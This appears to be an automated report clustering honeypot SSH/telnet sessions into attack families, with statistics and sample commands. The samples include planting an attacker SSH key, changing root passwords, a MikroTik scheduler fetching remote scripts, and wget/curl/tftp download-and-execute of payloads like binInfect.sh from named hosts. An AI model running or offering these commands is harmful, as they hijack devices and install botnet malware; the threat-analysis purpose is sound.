# FS Families Report

Total Families: 355

## Family 47

- **Total Session Volume**: 117960
- **FI-Unique Archetypes**: 25
- **Mean FS**: 0.905 (±0.065)
- **Medoid Archetype**: `037b520ca88bb8a8` (Session: `53fa6a7d9358`, n_rows=16)

**Medoid Execution Snippet:**
```text
cat /proc/cpuinfo | grep name | wc -l
echo -e "23456`!@#\neUxwSL92cdMJ\neUxwSL92cdMJ" | passwd | bash
echo "23456`!@#\neUxwSL92cdMJ\neUxwSL92cdMJ\n" | passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh  ...
```

**Consensus Skeleton (op, conn pairs):**
`[('cat', '|'), ('grep', '|'), ('head', '|'), ('awk', ';'), ('free', '|'), ('grep', '|'), ('awk', ';'), ('ls', ';'), ('which', ';'), ('crontab', ';'), ('w', ';'), ('uname', ';'), ('cat', '|'), ('grep', '|'), ('grep', '|'), ('wc', ';'), ('top', ';'), ('uname', ';'), ('uname', ';'), ('lscpu', '|'), ('grep', ';'), ('cd', '&&'), ('rm', '&&'), ('mkdir', '&&'), ('echo', '&&'), ('chmod', '&&')]`

Top operators: [('grep', 146), ('uname', 75), ('cat', 71), ('echo', 60), ('awk', 50), ('cd', 50), ('wc', 46), ('passwd', 30), ('rm', 27), ('head', 25)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| ceccc807fa82a5b4 | 000039a19f5b |       17 |           67226 |
| 04aa7f34bffa2c7f | 00001780eccc |       15 |           50705 |
| 0d177952b65312dd | 4520c0acd9ef |       14 |               3 |
| 146512fe0d42933d | 7773457d7c65 |       17 |               3 |
| 2ca98ef402f54302 | 59c90f31584f |       16 |               2 |
| b6c17ac7aa28db36 | 6d5b9e0e0ea3 |       19 |               2 |
| 037b520ca88bb8a8 | 53fa6a7d9358 |       16 |               1 |
| b471d4b792b964b5 | 8f2d4ccda3e5 |       19 |               1 |
| e4cf6f3d28fa01d9 | 0d424baff84b |       17 |               1 |
| d7484f218e9f122a | dc6ce425efd1 |       19 |               1 |

---

## Family 18

- **Total Session Volume**: 5150
- **FI-Unique Archetypes**: 27
- **Mean FS**: 0.845 (±0.086)
- **Medoid Archetype**: `eae6414b8fd34686` (Session: `00014ca23aad`, n_rows=27)

**Medoid Execution Snippet:**
```text
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPg ...
```

**Consensus Skeleton (op, conn pairs):**
`[('cd', '&&'), ('rm', '&&'), ('mkdir', '&&'), ('echo', '&&'), ('chmod', '&&'), ('cd', ';'), ('cat', '|'), ('grep', '|'), ('wc', ';'), ('echo', '|'), ('grep', '|'), ('awk', ';'), ('crontab', ';'), ('w', ';'), ('cat', '|'), ('grep', '|'), ('grep', '|'), ('awk', ';'), ('grep', '|')]`

Top operators: [('grep', 265), ('uname', 129), ('cat', 124), ('awk', 105), ('wc', 72), ('echo', 61), ('cd', 54), ('free', 53), ('head', 52), ('ls', 52)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| eae6414b8fd34686 | 00014ca23aad |       27 |            3546 |
| 699475776d1e4739 | 000085a3138e |       29 |            1575 |
| fdd6e4f02fbed5c8 | 594112b93c51 |       23 |               2 |
| dcac017e78f2aabb | c355eb05f03c |       20 |               2 |
| c22dc7aed0dd0ae0 | 1e4dd3d7fdcc |       21 |               2 |
| 827cfa2488284e84 | 13b2f2d32274 |       28 |               2 |
| a6ea38d57abe3efe | 15278c5da1ff |       26 |               1 |
| f95e0d71fa98a71d | 5236bae21062 |       26 |               1 |
| f1fcce207a4f9c0a | fac51978f690 |       26 |               1 |
| cc8ad3a4cdbf797a | 138c035667c4 |       25 |               1 |

---

## Family 223

- **Total Session Volume**: 3932
- **FI-Unique Archetypes**: 3
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `04bd524092fcc36a` (Session: `00155f9e1b74`, n_rows=1)

**Medoid Execution Snippet:**
```text
/system scheduler add name="U6" interval=10m on-event="/tool fetch url=http://bestony.club/poll/ac5dbf00-1ed6-4be9-af02-648d96b50872 mode=http dst-path=7wmp0b4s.rsc\r\n/import 7wmp0b4s.rsc" policy=api,ftp,local,password,policy,read,reboot,sensitive,sniff,ssh,telnet,test,web,winbox,write ;
```

**Consensus Skeleton (op, conn pairs):**
`[('PH_EXEC_1', 'EOS')]`

Top operators: [('PH_EXEC_1', 3)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 04bd524092fcc36a | 00155f9e1b74 |        1 |            3930 |
| 314244e4d5ead401 | 814e69b358fe |        1 |               1 |
| dbf8c28b3d7f80e7 | 068929cfbcc5 |        1 |               1 |

---

## Family 5

- **Total Session Volume**: 2364
- **FI-Unique Archetypes**: 20
- **Mean FS**: 0.805 (±0.089)
- **Medoid Archetype**: `853050ade19e9a82` (Session: `004937713162`, n_rows=20)

**Medoid Execution Snippet:**
```text
cd ~
chattr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvc ...
```

**Consensus Skeleton (op, conn pairs):**
`[('cd', '&&'), ('rm', '&&'), ('mkdir', '&&'), ('echo', '&&'), ('chmod', '&&'), ('cd', ';'), ('cat', '|'), ('grep', '|'), ('wc', ';'), ('echo', '|'), ('bash', ';'), ('cat', '|'), ('grep', '|'), ('head', '|'), ('awk', ';'), ('free', '|'), ('grep', '|'), ('awk', ';')]`

Top operators: [('grep', 111), ('cat', 60), ('echo', 56), ('cd', 51), ('uname', 46), ('awk', 44), ('wc', 39), ('passwd', 32), ('head', 23), ('free', 21)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| d31ce8bc09f366dc | 0000b4d9a0fe |       22 |            1536 |
| 853050ade19e9a82 | 004937713162 |       20 |             779 |
| 34d3f8fc31b551e1 | 042288bfcc53 |       18 |              27 |
| a96af724a6a3b89b | 2333d1f9d0d7 |       14 |               3 |
| 38995065fac38b67 | 78374839fb2f |       17 |               2 |
| 5beeb01f796fb62e | 3ad67ea5ea4a |       15 |               2 |
| 86a8b3ab7f1e3ca0 | 5b1ae12adfdd |       18 |               2 |
| 1742781fa029ccb3 | d5a270558298 |       19 |               1 |
| c767d936f9ba4364 | de72bd8c7569 |       16 |               1 |
| f36c639ee0ca21b5 | f4b1a5f52b83 |       15 |               1 |

---

## Family 39

- **Total Session Volume**: 1505
- **FI-Unique Archetypes**: 4
- **Mean FS**: 0.888 (±0.052)
- **Medoid Archetype**: `55e238fee714c34b` (Session: `c0ea324c5995`, n_rows=25)

**Medoid Execution Snippet:**
```text
cd ~
chattr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvc ...
```

**Consensus Skeleton (op, conn pairs):**
`[('cd', ';'), ('chattr', ';'), ('lockr', ';'), ('cd', '&&'), ('rm', '&&'), ('mkdir', '&&'), ('echo', '&&'), ('chmod', '&&'), ('cd', ';'), ('cat', '|'), ('grep', '|'), ('wc', ';'), ('echo', '|'), ('chpasswd', '|'), ('bash', ';'), ('rm', ';'), ('rm', ';'), ('kill', ';'), ('kill', ';'), ('echo', ';'), ('kill', ';'), ('cat', '|'), ('grep', '|'), ('head', '|'), ('awk', ';'), ('free', '|'), ('grep', '|'), ('awk', ';'), ('ls', ';'), ('which', ';'), ('crontab', ';'), ('w', ';'), ('uname', ';'), ('cat', '|'), ('grep', '|'), ('grep', '|')]`

Top operators: [('grep', 22), ('cd', 12), ('rm', 12), ('echo', 12), ('cat', 12), ('kill', 12), ('awk', 10), ('uname', 10), ('wc', 8), ('head', 6)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 5bcbb2fc05d9dde0 | 005a29dcd11e |       26 |            1087 |
| 8b5a1fe538204bd7 | 01ef93047ac0 |       24 |             416 |
| 55e238fee714c34b | c0ea324c5995 |       25 |               1 |
| c5187617e3f625f7 | 85e608ff76f1 |       20 |               1 |

---

## Family 6

- **Total Session Volume**: 1204
- **FI-Unique Archetypes**: 76
- **Mean FS**: 0.912 (±0.081)
- **Medoid Archetype**: `01d7ea4640c2b910` (Session: `c3a2727ae82d`, n_rows=21)

**Medoid Execution Snippet:**
```text
cat /proc/cpuinfo | grep name | wc -l
echo -e "cun\n4HuhZ9lEjL4P\n4HuhZ9lEjL4P" | passwd | bash
Enter new UNIX password:
echo "cun\n4HuhZ9lEjL4P\n4HuhZ9lEjL4P\n" | passwd
echo "321" > /var/tmp/.var03522123
rm -rf /var/tmp/.var03522123
cat /var/tmp/.var03522123 | head -n 1
cat /proc/cpuinfo | grep  ...
```

**Consensus Skeleton (op, conn pairs):**
`[('cat', '|'), ('grep', '|'), ('wc', ';'), ('cat', '|'), ('grep', '|'), ('head', '|'), ('awk', ';'), ('free', '|'), ('grep', '|'), ('awk', ';'), ('ls', ';'), ('which', ';'), ('crontab', ';'), ('w', ';'), ('uname', ';'), ('cat', '|'), ('grep', '|'), ('grep', '|'), ('wc', ';'), ('top', ';'), ('uname', ';'), ('uname', ';'), ('lscpu', '|')]`

Top operators: [('grep', 456), ('cat', 296), ('echo', 251), ('uname', 228), ('awk', 155), ('wc', 152), ('head', 147), ('rm', 140), ('passwd', 78), ('free', 76)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 133ff3968fcb63b9 | 014bb49d7da2 |       21 |             538 |
| ea2dd7eb2097a6b5 | 01be013ecbc6 |       19 |             496 |
| e56a94f706943ddc | 0341a53a93d3 |       16 |              43 |
| 48652d6e0fff4e6d | 1075ed897fc8 |       14 |              33 |
| b387b891cd05f22a | 1f5eb1a8bff3 |       18 |              14 |
| eb04f7703c16417f | 1ec78524fe48 |       22 |               8 |
| ee6dcbcdae896e74 | 25ec1e80c08b |       20 |               2 |
| f89f05ca441327a2 | 1fc41bcc4f53 |       18 |               2 |
| c4057a06a5b87065 | fd934ee1e7d6 |       19 |               1 |
| c31ae394209fc9b0 | 802962ed3ec9 |       19 |               1 |

---

## Family 125

- **Total Session Volume**: 1085
- **FI-Unique Archetypes**: 2
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `7823877f6d787c26` (Session: `004403c71b49`, n_rows=1)

**Medoid Execution Snippet:**
```text
scp -t /tmp/b8rQuLqM ;
```

**Consensus Skeleton (op, conn pairs):**
`[('scp', 'EOS')]`

Top operators: [('scp', 2)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 7823877f6d787c26 | 004403c71b49 |        1 |            1071 |
| 8d531cb77b739c70 | 193ded7d2ec0 |        1 |              14 |

---

## Family 25

- **Total Session Volume**: 1082
- **FI-Unique Archetypes**: 4
- **Mean FS**: 0.900 (±0.100)
- **Medoid Archetype**: `74beec8414dc35aa` (Session: `2acb88d6044b`, n_rows=2)

**Medoid Execution Snippet:**
```text
cd /tmp && chmod +x UwZm2JgD && bash -c ./UwZm2JgD 99698
./UwZm2JgD 99698 ;
```

**Consensus Skeleton (op, conn pairs):**
`[('cd', '&&'), ('chmod', '&&'), ('bash', ';'), ('PH_EXEC_2', 'EOS')]`

Top operators: [('cd', 4), ('chmod', 4), ('bash', 4), ('PH_EXEC_2', 4), ('scp', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| a26b2c9dc1c4f903 | 00019e6cbf98 |        2 |            1078 |
| b86e611b3b79ee46 | db7d6a8e369b |        3 |               2 |
| 74beec8414dc35aa | 2acb88d6044b |        2 |               1 |
| d9090725ba491cdb | cfd22bb062f6 |        2 |               1 |

---

## Family 214

- **Total Session Volume**: 604
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `de7e636e66a507f6` (Session: `001138e2d684`, n_rows=22)

**Medoid Execution Snippet:**
```text
start
enable
config terminal
system
linuxshell
su
shell
sh
cd /tmp || cd /var/ || cd /var/run || cd /mnt || cd /root || cd /;/bin/busybox echo -ne '\x45\x4c\x46'
/bin/busybox wget;/bin/busybox echo -ne '\x45\x4c\x46'
cd /tmp || cd /var/ || cd /var/run || cd /mnt || cd /root || cd /
rm -rf i
wget htt ...
```

**Consensus Skeleton (op, conn pairs):**
`[('start', ';'), ('enable', ';'), ('config', ';'), ('system', ';'), ('linuxshell', ';'), ('su', ';'), ('shell', ';'), ('sh', ';'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', ';'), ('busybox', ';'), ('busybox', ';'), ('busybox', ';'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', ';'), ('rm', ';'), ('wget', ';'), ('curl', ';'), ('busybox', ';'), ('chmod', '||'), ('cp', ';'), ('PH_EXEC_1', ';'), ('echo', 'EOS')]`

Top operators: [('cd', 12), ('busybox', 4), ('start', 1), ('enable', 1), ('config', 1), ('system', 1), ('linuxshell', 1), ('su', 1), ('shell', 1), ('sh', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| de7e636e66a507f6 | 001138e2d684 |       22 |             604 |

---

## Family 68

- **Total Session Volume**: 164
- **FI-Unique Archetypes**: 12
- **Mean FS**: 0.895 (±0.069)
- **Medoid Archetype**: `3a1e269325f4d01d` (Session: `04baecf108aa`, n_rows=25)

**Medoid Execution Snippet:**
```text
cat /proc/cpuinfo | grep name | wc -l
echo "root:ewqvQIihrRIq" | chpasswd | bash
echo "321" > /var/tmp/.var03522123
rm -rf /var/tmp/.var03522123
cat /var/tmp/.var03522123 | head -n 1
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, ...
```

**Consensus Skeleton (op, conn pairs):**
`[('cat', '|'), ('grep', '|'), ('wc', ';'), ('echo', '|'), ('bash', ';'), ('echo', ';'), ('rm', ';'), ('cat', '|'), ('head', ';'), ('cat', '|'), ('grep', '|'), ('head', '|'), ('awk', ';'), ('free', '|'), ('grep', '|'), ('awk', ';'), ('ls', ';'), ('which', ';'), ('crontab', ';'), ('w', ';'), ('uname', ';'), ('cat', '|'), ('grep', '|'), ('grep', '|'), ('wc', ';'), ('top', ';'), ('uname', ';'), ('uname', ';'), ('lscpu', '|'), ('grep', ';'), ('echo', ';'), ('rm', ';'), ('cat', ';'), ('echo', ';'), ('cat', ';'), ('sleep', '&&'), ('cd', ';'), ('echo', '|'), ('base64', '|')]`

Top operators: [('cat', 72), ('grep', 72), ('echo', 72), ('uname', 36), ('rm', 31), ('cd', 26), ('wc', 24), ('bash', 24), ('head', 24), ('awk', 24)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| c96b1b6710eb9618 | 00f1463b3dd1 |       26 |              43 |
| 8aa9a9c4ed9fb9c4 | 006559f916e7 |       24 |              42 |
| 3a1e269325f4d01d | 04baecf108aa |       25 |              38 |
| 1717672cb25acf88 | 01e5fd6970bc |       27 |              33 |
| 3c5ba59fa02a3d27 | 804667956812 |       26 |               1 |
| 3eae5b85af9fbe4b | 5fa236bc314c |       27 |               1 |
| 5fc125c808c8b98d | 564cfcbccf2a |       25 |               1 |
| 8eba5c9be1a85d8b | aeaccae6efa5 |       24 |               1 |
| a5260f123ea84bab | ed4ce13caaa2 |       24 |               1 |
| a82f01456147da8d | a493d4408541 |       27 |               1 |

---

## Family 37

- **Total Session Volume**: 111
- **FI-Unique Archetypes**: 43
- **Mean FS**: 0.851 (±0.089)
- **Medoid Archetype**: `07fb87a40943e18f` (Session: `aa9865d183fe`, n_rows=16)

**Medoid Execution Snippet:**
```text
sh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /
wget http://betaalverzoek.ir/binInfect.sh
curl -O http://betaalverzoek.ir/binInfect.sh
chmod 777 binInfect.sh
sh binInfect.sh
tftp betaalverzoek.ir -c get binInfect.sh
chmod 777 binInfect.sh
sh binInfect.sh
tftp -r binInfect2.sh -g betaalverzo ...
```

**Consensus Skeleton (op, conn pairs):**
`[('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', ';'), ('wget', ';'), ('chmod', ';'), ('tftp', ';'), ('chmod', ';'), ('tftp', ';'), ('chmod', ';')]`

Top operators: [('cd', 214), ('sh', 182), ('chmod', 129), ('tftp', 86), ('rm', 69), ('wget', 43), ('ftpget', 39), ('curl', 25), ('shell', 10), ('ls', 4)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 0e2f33f329730941 | 03710f5c6d9d |       15 |              20 |
| c84efd5349d0e4a6 | 01eccf67599c |       16 |               9 |
| 2c683b6a6683c196 | 4f21b025a894 |       15 |               8 |
| fe7a5074f6e1b0d6 | 72e7a3c86b04 |       14 |               7 |
| c05da25391985850 | 2d3b702a9b88 |       15 |               7 |
| 4ed4de85413dd110 | 48003f7aa1d1 |       16 |               4 |
| d37e69841fafabd0 | 266fdff3aa9a |       15 |               4 |
| 1adee94e0cbbc77e | 2311390499a6 |       18 |               4 |
| cd5c93af44ede945 | 0b7db230d185 |       12 |               3 |
| 6c0c1f8dfdf9bf0e | 5e429d04fcc1 |       15 |               3 |

---

## Family 137

- **Total Session Volume**: 101
- **FI-Unique Archetypes**: 20
- **Mean FS**: 0.944 (±0.035)
- **Medoid Archetype**: `3d835361fff7bc09` (Session: `ea7e0e563ac8`, n_rows=52)

**Medoid Execution Snippet:**
```text
enable
system
shell
sh
/bin/busybox mkdir /tmp/
>/tmp/.file && cd /tmp/
/bin/busybox rm -rf .file .z .x
/bin/busybox mkdir /var/
>/var/.file && cd /var/
/bin/busybox rm -rf .file .z .x
/bin/busybox mkdir /dev/
>/dev/.file && cd /dev/
/bin/busybox rm -rf .file .z .x
/bin/busybox mkdir /mnt/
>/mnt/.fi ...
```

**Consensus Skeleton (op, conn pairs):**
`[('enable', ';'), ('system', ';'), ('shell', ';'), ('sh', ';'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('busybox', ';'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('busybox', ';'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('busybox', ';'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('busybox', ';'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('busybox', ';'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('busybox', ';'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('busybox', ';'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('busybox', ';'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('busybox', ';'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('busybox', ';'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('busybox', ';'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('busybox', ';'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('busybox', ';'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('busybox', ';'), ('busybox', ';'), ('busybox', ';'), ('>', ';')]`

Top operators: [('busybox', 678), ('>', 325), ('cd', 281), ('sh', 21), ('enable', 20), ('system', 20), ('shell', 20), ('PH_EXEC_1', 9), ('PH_EXEC_2', 2)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| dba3a67af76344e3 | 07324c69b33d |       57 |              40 |
| 54140705efee7f91 | 2e0443a58a13 |       52 |              13 |
| 5fcc90093d5b24fe | 30b3b25deac8 |       52 |               9 |
| 8c5e8885ad61844b | 03a8318f11ac |       58 |               8 |
| b2e700aaa74d0f3d | 1b3d4938eab5 |       56 |               8 |
| 467d28fc1ba34b86 | 0bb7c1c603e5 |       57 |               4 |
| 7d74c770b213d8ff | cf359cb96848 |       52 |               3 |
| e777d7177e339480 | 140af84ebb41 |       52 |               3 |
| b51f09cddd057153 | 2100a78bc38f |       61 |               2 |
| 61bcc6d579261a5e | b6bdc841bc42 |       52 |               1 |

---

## Family 61

- **Total Session Volume**: 96
- **FI-Unique Archetypes**: 6
- **Mean FS**: 0.892 (±0.079)
- **Medoid Archetype**: `2dd9beeed4e3189c` (Session: `02d2a09a4525`, n_rows=8)

**Medoid Execution Snippet:**
```text
uname -a
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /
wget oakro.ddns.net/ssh || curl -o ssh oakro.ddns.net/ssh
tar xvf ssh
cd .ssh
chmod +x *
./sshd
./krane 123456 ;
```

**Consensus Skeleton (op, conn pairs):**
`[('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', ';'), ('wget', '||'), ('curl', ';'), ('tar', ';'), ('cd', ';'), ('chmod', ';'), ('PH_EXEC_1', ';'), ('PH_EXEC_2', 'EOS')]`

Top operators: [('cd', 37), ('wget', 6), ('curl', 6), ('tar', 6), ('chmod', 6), ('PH_EXEC_1', 6), ('PH_EXEC_2', 6), ('uname', 4), ('rm', 2)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 2dd9beeed4e3189c | 02d2a09a4525 |        8 |              55 |
| b4676d563c7edb91 | 13facf2fe2b8 |        8 |              31 |
| 1af8822bc8bd9196 | 04359dbed8f0 |        6 |               7 |
| 72ae8e39bc5cc11e | 6fd2900526c5 |        8 |               1 |
| b6d6760f1a199e24 | 85fb1ea0713e |        7 |               1 |
| d3c98f8803b6c541 | 96ae839190f2 |        8 |               1 |

---

## Family 78

- **Total Session Volume**: 69
- **FI-Unique Archetypes**: 10
- **Mean FS**: 0.852 (±0.064)
- **Medoid Archetype**: `92e032040e6682f3` (Session: `5179455d469b`, n_rows=14)

**Medoid Execution Snippet:**
```text
cat /proc/cpuinfo | grep name | wc -l
echo -e "saas\nXV80pgIxwfxI\nXV80pgIxwfxI" | passwd | bash
Enter new UNIX password:
echo "saas\nXV80pgIxwfxI\nXV80pgIxwfxI\n" | passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $ ...
```

**Consensus Skeleton (op, conn pairs):**
`[('cat', '|'), ('grep', '|'), ('wc', ';'), ('echo', '|'), ('bash', ';'), ('cat', '|'), ('grep', '|'), ('head', '|'), ('awk', ';'), ('free', '|'), ('grep', '|'), ('awk', ';'), ('ls', ';'), ('which', ';'), ('crontab', ';'), ('w', ';'), ('uname', ';'), ('cat', '|'), ('grep', '|'), ('grep', '|')]`

Top operators: [('grep', 50), ('cat', 32), ('wc', 20), ('awk', 20), ('uname', 18), ('echo', 16), ('head', 12), ('bash', 10), ('free', 10), ('ls', 10)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| ff46e901c79ccd43 | 12e2914c08ff |       15 |              11 |
| 9f30223b8bfd8e5e | 1c4052207fd2 |       12 |              10 |
| bbc3dd203cc8c152 | 2bb3182ef657 |       13 |              10 |
| 2c711b7acd99b342 | 09e5208abce5 |       12 |               8 |
| db87a3ef9aae0b59 | 26709acbefff |       13 |               8 |
| e75a2b2f27a2c494 | 435cb9571bcd |       11 |               8 |
| 92e032040e6682f3 | 5179455d469b |       14 |               6 |
| b5992bb0cecc7fdd | 573601a1c024 |       10 |               5 |
| 5913e1796b564c98 | 28e97baf1f03 |       13 |               2 |
| 9f283f369c1d6c18 | 7a263e7c551f |       16 |               1 |

---

## Family 3

- **Total Session Volume**: 60
- **FI-Unique Archetypes**: 11
- **Mean FS**: 0.797 (±0.088)
- **Medoid Archetype**: `a56fa0f50093a086` (Session: `4c5f1f3e5a46`, n_rows=10)

**Medoid Execution Snippet:**
```text
cat /proc/cpuinfo | grep name | wc -l
echo -e "123\nWPI20HLjTBRL\nWPI20HLjTBRL" | passwd | bash
Enter new UNIX password:
echo "123\nWPI20HLjTBRL\nWPI20HLjTBRL\n" | passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, ...
```

**Consensus Skeleton (op, conn pairs):**
`[('cat', '|'), ('grep', '|'), ('wc', ';'), ('echo', '|'), ('bash', ';'), ('cat', '|'), ('grep', '|'), ('head', '|'), ('awk', ';'), ('free', '|'), ('grep', '|')]`

Top operators: [('grep', 33), ('cat', 28), ('echo', 24), ('awk', 22), ('head', 17), ('passwd', 14), ('wc', 11), ('bash', 11), ('free', 11), ('ls', 9)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| a8a6780031eb013b | 001dd1bb9ca5 |        9 |              15 |
| a56fa0f50093a086 | 4c5f1f3e5a46 |       10 |              10 |
| d2264f896f6e5c01 | 0bd8cdf21600 |       11 |              10 |
| 51c424153304bbc9 | 039638228b8c |        8 |               9 |
| d8df3e9d6d62c00b | 362050330b3f |        6 |               6 |
| a9f7942acd0e45d1 | 062fdde672d5 |       12 |               3 |
| 35e5c95fd11b2aa6 | cce429a7afb3 |       11 |               2 |
| dc7948c9eb18d25c | 080fe4320dbd |       14 |               2 |
| 0b076b0dd5584843 | a2e76838478f |        7 |               1 |
| 6c12e94e39fdca4e | 7923e3bc5a20 |       13 |               1 |

---

## Family 150

- **Total Session Volume**: 58
- **FI-Unique Archetypes**: 17
- **Mean FS**: 0.921 (±0.055)
- **Medoid Archetype**: `0005d1d3118dd48f` (Session: `59b23f4ceb27`, n_rows=89)

**Medoid Execution Snippet:**
```text
enable
system
shell
sh
/bin/busybox mkdir /tmp/
>/tmp/.file && cd /tmp/
/bin/busybox rm -rf .file .z .x
/bin/busybox mkdir /var/
>/var/.file && cd /var/
/bin/busybox rm -rf .file .z .x
/bin/busybox mkdir /dev/
>/dev/.file && cd /dev/
/bin/busybox rm -rf .file .z .x
/bin/busybox mkdir /mnt/
>/mnt/.fi ...
```

**Consensus Skeleton (op, conn pairs):**
`[('enable', ';'), ('system', ';'), ('shell', ';'), ('sh', ';'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('busybox', ';'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('busybox', ';'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('busybox', ';'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('busybox', ';'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('busybox', ';'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('busybox', ';'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('busybox', ';'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('busybox', ';'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('busybox', ';'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('busybox', ';'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('busybox', ';'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('busybox', ';'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('busybox', ';'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('busybox', ';'), ('busybox', ';'), ('busybox', ';'), ('>', ';'), ('>', ';'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', 